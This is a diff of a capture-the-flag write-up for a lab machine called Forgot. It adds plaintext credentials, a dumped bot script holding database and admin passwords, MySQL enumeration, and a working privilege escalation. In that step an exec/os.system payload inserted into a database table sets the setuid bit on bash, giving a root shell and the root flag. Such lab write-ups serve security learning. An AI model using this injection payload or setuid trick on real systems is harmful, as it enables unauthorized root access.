@@ -237,6 +237,7 @@ Open a new private window and navigate to the webpage you specified in the link.
 
 ![image](https://user-images.githubusercontent.com/105310322/207165880-4f1503bf-8ff8-4276-9d46-9602e11de7e9.png)
 
+diego:dCb#1!x0%gjq
 
 ```console
 └─$ ssh diego@10.10.11.188                                                                     
@@ -275,7 +276,6 @@ uid=1000(diego) gid=1000(diego) groups=1000(diego)
 ```console
 diego@forgot:~$ cat user.txt
 0916****************************
-********************************
 ```
 
 ```console
@@ -440,4 +440,111 @@ for i in range(len(Xnew)):
      t = threading.Thread(target=assessData, args=(i,))
 #     t.daemon = True
      t.start()
+```
+
+```console
+diego@forgot:~$ cat bot.py
+#!/usr/bin/python3
+import os
+import mysql.connector
+import requests
+import netifaces as ni
+
+# Fetch Links
+conn = mysql.connector.connect(host="localhost",database="app",user="diego",password="dCb#1!x0%gjq")
+cursor = conn.cursor()
+cursor.execute('select * from forgot')
+r = cursor.fetchall()
+
+# Open reset links
+for i in r:
+	try:
+		requests.get(i[1],timeout=10)
+	except:
+		pass
+
+# Open tickets as admin
+cursor.execute('select * from escalate')
+r = cursor.fetchall()
+tun_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+d = requests.post(f'http://{tun_ip}/login',data={'username':'admin','password':'dCvbgFh345_368352c@!'})
+cookie = d.headers['Set-Cookie'].split('=')[1].split(';')[0]
+
+for i in r:
+	try:
+		print(i[2])
+		requests.get(i[2],cookies={'session':cookie})
+		requests.get(i[2],cookies={'session':cookie})
+		requests.get(i[2],cookies={'session':cookie})
+		cursor.execute('delete from escalate where link=%s',(i[2],))
+		conn.commit()
+	except:
+		pass
+conn.close()
+```
+
+```console
+diego@forgot:~$ mysql -u diego -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 333
+Server version: 8.0.31-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2022, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+```
+```console
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| app                |
+| information_schema |
+| performance_schema |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql> use app
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+```
+
+```console
+mysql> show tables;
++---------------+
+| Tables_in_app |
++---------------+
+| admin_tickets |
+| escalate      |
+| forgot        |
+| tickets       |
+| users         |
++---------------+
+5 rows in set (0.00 sec)
+
+mysql>
+```
+https://github.com/advisories/GHSA-75c9-jrh4-79mc
+
+```console
+mysql> insert into escalate values ("a","b","c",'hello=exec("""\nimport os\nos.system("chmod +s /usr/bin/bash")""")');
+Query OK, 1 row affected (0.01 sec)
+```
+
+```console
+diego@forgot:/opt/security$ bash -p
+bash-5.0# id
+uid=1000(diego) gid=1000(diego) euid=0(root) egid=0(root) groups=0(root),1000(diego)
+bash-5.0# cat /root/root.txt 
+ad062***************************
 ```
